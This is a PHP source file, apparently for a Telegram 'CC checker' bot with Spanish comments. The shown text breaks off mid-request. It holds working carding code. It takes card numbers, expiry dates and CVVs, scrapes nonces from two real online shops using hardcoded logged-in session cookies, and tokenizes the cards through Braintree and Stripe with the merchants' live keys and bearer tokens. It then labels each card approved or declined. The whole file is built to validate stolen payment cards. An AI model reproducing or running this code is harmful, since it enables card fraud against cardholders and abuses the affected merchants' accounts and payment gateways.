<?php

function ats($chatId, $message, $message_id) {
 global $user, $admin, $logo, $userType, $live_array; 
	
	$tipo = $userType; //TIPO DE USUARIO//


	

if (preg_match('/^(!|\/|\.)chk/', $message)) {

	$respuesta = "Gate no disponible por el momento!!";
	sendMessage($chatId, $respuesta, $message_id);
	die();
$lista = substr($message, 5);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
//$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}
if (strlen($mes) == 1 && $mes <= 9) {
    $mes = '0' . $mes;
}

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /chk CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$authbear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE3MjMzODQsImp0aSI6IjIzZGExZjY3LTYwODItNDQ4Mi1iMTQ0LTEzMmQwNDNmYzFmNiIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImZzdG9wbGxjX2luc3RhbnQifX0.-HWQt8eUwWHchQAq7ZM0NZZRbqwKaPI8v0y_aFZt1l0MjwFXFkLdu32Og8uJu7G0F_mKjNtw4t5Iz37sptkqdg';
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/?currency=USD',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'yith_wcmcs_currency=USD; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-09%2019%3A07%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-09%2019%3A07%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=80f70dca-8270-4abd-a4dd-0c24d1205f05800a30; __stripe_sid=2f6142f7-a2eb-4815-a8f2-49a21ce3ec876ff8db; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=alya%7C1741720203%7CwvqBjpyDQtJjARdac4qaH9yxIoUHorEvHYoTP5YZAIw%7Cd33c135d6e4fcb55d57cd02faedd680196e2783fd7f9dfda3d8652caf2d14de0; sbjs_session=pgs%3D28%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%3Fcurrency%3DUSD',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.8',
    'referer: https://fstopgear.com/my-account/payment-methods/?currency=USD',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$patron = '/name="woocommerce-add-payment-method-nonce" value="([^"]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
echo "$nonce\n"; // Output: 5f49251774
////SACA EL TOKEN///


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c4f5e33c-83a0-4e21-87c7-a4b49f6ad579"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10010","streetAddress":"6195 bollinger rd"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'authorization: Bearer '.$authbear.'',
    'braintree-version: 2018-05-10',
    'accept-language: es-US,es;q=0.8',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["data"]["tokenizeCreditCard"]["token"];
curl_close($curl);

echo "ID: $id\n";



$cadena = 'payment_method=braintree_cc&braintree_cc_nonce_key='.$id.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22a824fec6a4a7e51e3db99183d9e6297e%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c4f5e33c-83a0-4e21-87c7-a4b49f6a%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fsxp92tvhvfzqjd9y%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fsxp92tvhvfzqjd9y%22%7D%2C%22merchantId%22%3A%22sxp92tvhvfzqjd9y%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22sxp92tvhvfzqjd9y%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22f-stop+LLC%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE2MzU0NjIsImp0aSI6ImFlNjU2ZGU4LWU0NjUtNDkzMS04OWE3LTY4ZGMxZGFlYTAxOSIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.gUMPZM57hGnLGS5yW3LzVLUhIrBBh5OOPYoiKRA75dualoXaYGMduPxE0K_vCX01Iq6UwwUFtUmrt9ixrvFlMg%22%2C%22paypalClientId%22%3A%22AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22f-stop+LLC%22%2C%22clientId%22%3A%22AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22fstopllc_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce=NONCE1&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F%3Fcurrency%3DUSD&woocommerce_add_payment_method=1';
$data = str_replace('NONCE1', $nonce, $cadena);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/?currency=USD',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
  CURLOPT_COOKIE => 'yith_wcmcs_currency=USD; ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-09%2019%3A07%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-09%2019%3A07%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=80f70dca-8270-4abd-a4dd-0c24d1205f05800a30; __stripe_sid=2f6142f7-a2eb-4815-a8f2-49a21ce3ec876ff8db; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=alya%7C1741720203%7CwvqBjpyDQtJjARdac4qaH9yxIoUHorEvHYoTP5YZAIw%7Cd33c135d6e4fcb55d57cd02faedd680196e2783fd7f9dfda3d8652caf2d14de0; sbjs_session=pgs%3D23%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%3Fcurrency%3DUSD',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'cache-control: max-age=0',
    'sec-ch-ua-platform: "Android"',
    'origin: https://fstopgear.com',
    'accept-language: es-US,es;q=0.8',
    'referer: https://fstopgear.com/my-account/add-payment-method/?currency=USD',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);

$patron = '/<div class="wc-block-components-notice-banner__content">(.*?)<\/div>/s';
//$patron = '/<div class="wc-block-components-notice-banner__content">(.*?)<\/div>/';
preg_match($patron, $response, $coincidencias);
$mensaje = trim($coincidencias[1]);
$patron = '/Reason: (.*)/';
preg_match($patron, $mensaje, $coincidencias);
$respo = $coincidencias[1];
curl_close($curl);

if (empty($respo)){
$respo = trim($mensaje);
}


if (empty($respo)){
$respo = "Approved";
}


//echo "RESPO: $respo\n"; // Output: There was an error saving your payment method. Reason: Declined - Call Issuer

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

//	𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑
//	𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝!
	
//	𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Call Issuer. Pick Up Card.') !== false || strpos($respo, 'Gateway Rejected: risk_threshold') !== false || strpos($respo, 'Declined - Call Issuer') !== false || strpos($respo, 'Processor Declined') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ⚠️\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}



	
if (preg_match('/^(!|\/|\.)st/', $message)) {
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$lista = "$cc|$mes|$ano|$cvv";


$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /st CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

////EXTRAE EL NONCE////
$cc = implode('+', $partes);


$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://stainlessnutsandbolts.co.uk/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-13%2017%3A06%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-03-13%2017%3A06%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3dc49451096e94637e98b7d302410bbe=tataji3523%7C1743095179%7C6ykFKTmQOiQ8TVaZQ08uhYAymLk9M7zTVate4fls0E3%7C3800628016aa866c6fcc02818d9bc626224a03f58f175ef9036dd2b3b063bdc6; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstainlessnutsandbolts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.7',
    'referer: https://stainlessnutsandbolts.co.uk/my-account/add-payment-method/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//

echo "$nonce\n";
echo "$pk_live\n";
	
$curl = curl_init();                                                                    
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'billing_details%5Bname%5D=+&billing_details%5Bemail%5D=tataji3523%40vatatire.com&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fc44ca35285%3B+stripe-js-v3%2Fc44ca35285%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fstainlessnutsandbolts.co.uk&time_on_page=41675&client_attribution_metadata%5Bclient_session_id%5D=d8a04382-0fa4-47eb-84b7-8f3dddf4581a&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1QmxFeC6CRNjGWbA&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUzQ3SjBUbXhnMVVCd3FpYnp0bVZySGtJSlI2aVA2RnRGQUtqSWFyYi9uQlcwRlJUMFdEQmFJWWRFQXBVWWJBZTdqREZNUDBvalhoQlJpYXQvQUErOEgzRmhLdEZPaXFJL1QxV2NUMEJvaGQwS1ZHRE5pd0hDNmkwYU1hSWFGNm1VQWtTMWpLNHkvcHQ3RmdoUDJpSFF1SjVTYWltYWtKcklqMU9GY3hVbWx4Nzd2UEhFNzR6SisxeHNrWDliT1luS1JtN1VTUWdiekVKUzVibndad1VRSGpiZTNpdHd4d2xOeE1IbTBEbUs1V3dYdEc0cmRGWEtiNytiVHNUblJweXpRMCt0S2VrUkY2MGRlcC9tSWJzZ3RlZmYzdXFMYkdjQTlyZXArQkxIKzJPWE1vb0dLVGo4KzB6V2FwRXN5cDFPcnJFcmI3TW1mdnNmbExUc0locUNlSVg1OGtHRlNDdFR3eFB4OEQrMzhFM0d1c2hnR05SNHlyc1QwNHNOQjBlZTQwQmxVbFNDK3ZKVU42YmVOeXpycTUxREdKOEJxdWN0RDd0NWRMZHNSYkc0bzlQa0Rzb1FRV3BEaG5lU2wveERCZUswekE3MlRuVUx3bU9JZFpuRDhzQkJWWjJ6bUw2MHJZRzNwbkVxc0pKK1ZMY2NwWW02aWVqT2FJejQyWnRSbUMzUStQaE5ocDFFZlUwaWhkREI4THdVcHZ6b1lEZ2RuNzIvb0VSNGNqdEp5UXdia3ZpRCtZK1RPWkJUMnI1WWQ2YW05NXNacGt1eThvbndrSVBUR1h2OWxlZUVBamxONWRFQkxLbHpqMWVhVjJqMk1RNTBGMURoSEJqOERzUzRiUHIyTUJaMVAwbC9LTzJCOEl6WXRjVDFrQlN6ekQzb3A2dkNpeG91Qmt5eXRsTkptV1VicytHdGVlS1pmS0JsMThsNjFLL2d0a0VZT2VWaG96K3QxSEVoT0VYamVhWWZUWnhBdU5xd0x4S1ZMOGxwZFZpMGJTMUhFbzd3dGZnT25KTURCUVdDMEp5aWh6Q0ptSnU2SGZLK3hoZzd4d1VtR1dwbEJNcE1YWllwYlFOOUY1ZHYwUFllSTdmWGFwb29hTGtnbFhxdGtlYmNUcWNYS0FQVFNtT01hT24wbU5wdSt3ZmlEeUhMUVpibmdSQkRQWGRmMkM5eFVFUTh4K1gwbnFEYUxqd2R6enhzWjFTZVNMUGVFZGprT0pNM0xiWjNsQ3lnNCtyYWhEcTlBQ3JreFJHdnNNMnc1dUZCY2RudmpRbmZiY2grS1dhUkNneHpodGJzY2Qwdm9McFc4NHRMZHVHS2Nwb3FyY1BDdnJydnFHaXJ6NjhVcDJBalltVVNhbEI2VHNNejkwZ2JMaTBrSXlDbnY0Y2pLdjN2eHlWc2FjQUNWUndOSzB6YmRRZ2lPcmowK3crY0pNdHh2SmRjdVROTUV0VDIzVFlPS2x4VDhWb3pUZjhITjlMbW5MVW1QbmRYbm5Hd2ZMOGMwa3BwR21HcU5iN2NveU9ZVHMyYkVhTjNFaW1ackhFZFJVMVJHaXZSeFlyMUhCU2FQODBWT2IwaWVVUUVtNVRSOEUzRDdDZTFYY0NnZmQzK1dJendzTW12SHhVMkd0b0VOYXpkd21rZzdsWWdsR0tRRnZna21uaXZQWDUvaXJwSXFldmhRMVU4NHMvb05tTFlSYVlEcjU5